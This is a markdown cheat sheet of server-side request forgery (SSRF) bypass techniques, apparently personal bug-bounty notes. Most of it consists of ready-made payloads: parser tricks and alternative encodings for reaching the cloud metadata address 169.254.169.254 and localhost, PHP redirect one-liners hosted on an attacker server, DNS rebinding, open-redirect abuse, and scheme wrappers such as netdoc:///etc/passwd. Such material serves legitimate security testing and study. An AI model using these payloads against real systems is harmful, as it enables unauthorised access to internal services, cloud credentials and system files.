## Refernces -

- SSRF vulns & where to find them by **Detectify** - https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/
- SSRF attacks via PDF generators by **Nahamsec & Cody Brocious** - https://docs.google.com/presentation/u/0/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/edit
- A new era of SSRF by **Orange Tsai** - https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
## Tools -

- SSRFmap - https://github.com/swisskyrepo/SSRFmap

## Bypasses -

#### URL fragment 

Use the `#` character to indicate a URL fragment. For example:

```http
https://evil-host#expected-host
```

#### Embed credentials in a URL before the hostname, using the @ character. For example:

```http
https://expected-host:fakepassword@evil-host
```
#### Leverage DNS naming hierarchy

```http
https://expected-host.evil-host
```
#### Comply to regex used for whitelist by providing the req url as uri

Here expected host is present and thereby it satisfies the whitelist & also is treated as directory portion of url.

```http
http://localhost/expectedhost.com
```

#### Use Hostnames Instead of IPs

Sometimes, the developers just banned the use of 169.254.169.254 directly. In that case, we can simply use hostnames that resolve to the same IP address. 

> Nip.io allows simple wildcard DNS for any IP address

here are some examples. All of these resolve to 169.254.169.254.

169.254.169.254.nip.io
169-254-169-254.nip.io
a9fea9fe.nip.io (hexadecimal IP notation)
Something.google.com.169.254.169.254.nip.io

#### HTTP Redirects
Sometimes, bypassing SSRF protection is as easy as using an HTTP redirect. 

Let’s say we can make a request to customdomain.com, but not 169.254.169.254. 

We can host a simple script on customdomain.com to 302 redirect to 169.254.169.254. If the vulnerable endpoint follows redirects but doesn’t check them, we have SSRF! 

Here’s a simple PHP script to perform the redirect.

```php
<?php header(“Location: http://169.254.169.254/”) ?>
```

#### DNS Rebinding

Many applications attempt to thwart SSRF attempts with a code pattern that looks like this:

```php
func fetch_if_allowed(url string){
    if ip_is_blocked(resolve($url)){
        return false
    } else {
        fetch($url)
    }
}
```

This code is vulnerable to a form of TOCTOU (time-of-check, time-of-use) vulnerability called DNS rebinding. An attacker can set up a DNS server that responds with two different IP addresses on alternating requests, one is allowed through the ip_is_blocked() function, and the other is not.

> Taviso's rbndr - https://github.com/taviso/rbndr

In this case, we could set up a DNS rebinding service such as Taviso’s rbndr to resolve to 1.1.1.1 every second time, and 169.254.169.254 every other time. When the domain is resolved the first time, the application sees that it resolves to 1.1.1.1, and allows the code to flow into the else statement, where the domain is resolved again – this time to 169.254.169.254. 🎉

#### Non-Standard IP Notations
Sometimes, specific IP addresses are blocked, such as 169.254.169.254. In this case, we may be able to bypass it by simply using different IP notation. For example, all of these will be interpreted as 169.254.169.254. 

- 025177524776 (octal)
- 0xa9fea9fe (hexadecimal)
- 2852039166 (integer)
- ::ffff:a9fe:a9fe (IPv6)

> Use thsi website to convert IP address to all the 4 types of notation - https://www.abuseipdb.com/tools/ip-address-converter

#### Find an openredirect

If an open redirect is found, try to use that path to induce SSRF and access backend systems.

```http
POST /upload 
Host: test.example.com
url=http://pics.example.com/123?redirect=localhost
```

In the above request, we use the open redirect vulnerability on `pics.example.com`  domain to redirect to localhost

#### Redirect by hosting a server containing malicious php content

Make the server request a URL that we control & that **redirects to the blocklist address**.

Ask the target server to send arequest to our server

```http
http://public.example.com/proxy?url=http://attacker.com/ssrf
```

On our server host a file with the following content,

```php
<?php header("location: http://127.0.0.1"); ?>
```

#### SSRF Wrappers / URL Schema

The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled).

```http
gopher://
file://
fd://
expect://
ogg://
tftp://
dict://
ftp://
ssh2://
file://
http://
https://
imap://
pop3://
mailto://
smtp://
telnet://
```

In case of **Java environments**, use these payloads

```http
netdoc:///etc/passwd
netdoc:///etc/hosts
jar:proto-schema://blah!/
jar:http://localhost!/
jar:http://127.0.0.1!/
jar:http://0.0.0.0!/
jar:ftp://local-domain.com!/
```

#### Enclosed Alphanumeric -

```http
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
```
